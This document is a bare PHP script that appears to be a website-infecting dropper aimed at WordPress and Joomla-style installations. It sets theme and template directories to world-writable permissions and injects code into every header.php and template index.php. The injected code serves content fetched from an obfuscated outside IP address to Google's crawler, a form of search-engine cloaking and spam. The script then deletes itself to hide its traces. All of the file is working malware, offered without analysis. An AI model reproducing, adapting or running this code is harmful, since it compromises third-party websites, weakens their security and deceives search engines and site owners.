<?php
$code = '<?php $botbotbot = "...".mb_strtolower($_SERVER[HTTP_USER_AGENT]);$botbotbot = str_replace(" ", "-", $botbotbot);if (strpos($botbotbot,"google")){$ch = curl_init();    $xxx = sqrt(30976);    curl_setopt($ch, CURLOPT_URL, "http://$xxx.31.253.227/cakes/?useragent=$botbotbot&domain=$_SERVER[HTTP_HOST]");       $result = curl_exec($ch);       curl_close ($ch);  	echo $result;}?>
';

if (file_exists("wp-content"))
{
chmod("wp-content", 0777);
if (file_exists("wp-content/themes"))
{
chmod("wp-content/themes", 0777);
	$dirs = scandir("wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir("wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
chmod("wp-content/themes/$dir", 0777);			
			if (file_exists("wp-content/themes/$dir/header.php")) 
			{
chmod("wp-content/themes/$dir/header.php", 0777);				
		   				  $file = fopen("wp-content/themes/".$dir."/header.php", "r");  
                          $buffer = fread($file, filesize("wp-content/themes/".$dir."/header.php")); 
						  $buffer = str_replace("\n", "11111111111111", $buffer);
                          fclose($file);
               if (strpos($buffer, '31.253.227')<5) 
               { 
		       unlink ("wp-content/themes/".$dir."/header.php");
						 	$in = fopen("wp-content/themes/".$dir."/header.php", "w");
				             fwrite($in, $code);
							 $buffer = str_replace("11111111111111", "\n", $buffer);
			                 fwrite($in, $buffer);
				             fclose($in);
               }
			}
		}
	}
}
}

if (file_exists("templates"))
{
chmod("templates", 0777);
	 $dirs = scandir("templates");
	 	foreach ($dirs as $dir)
	     {
		         if ((is_dir("templates/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		          {
chmod("templates/$dir", 0777);					  
					  if (file_exists("templates/".$dir."/index.php")) 
					  {
chmod("templates/".$dir."/index.php", 0777);						  
						  $file = fopen("templates/".$dir."/index.php", "r");  
                          $buffer = fread($file, filesize("templates/".$dir."/index.php")); 
						  $buffer = str_replace("\n", "11111111111111", $buffer);
                          fclose($file);	
                           if (strpos($buffer, '31.253.227')<5)  
                                   {
							unlink ("templates/".$dir."/index.php");
					         $in = fopen("templates/".$dir."/index.php", "w");
				             fwrite($in, $code);
							 $buffer = str_replace("11111111111111", "\n", $buffer);
			                 fwrite($in, $buffer);
				             fclose($in);
 								   }									   
					  }
		          }
	     }
}


//echo "...";
@unlink("z1.php");

?>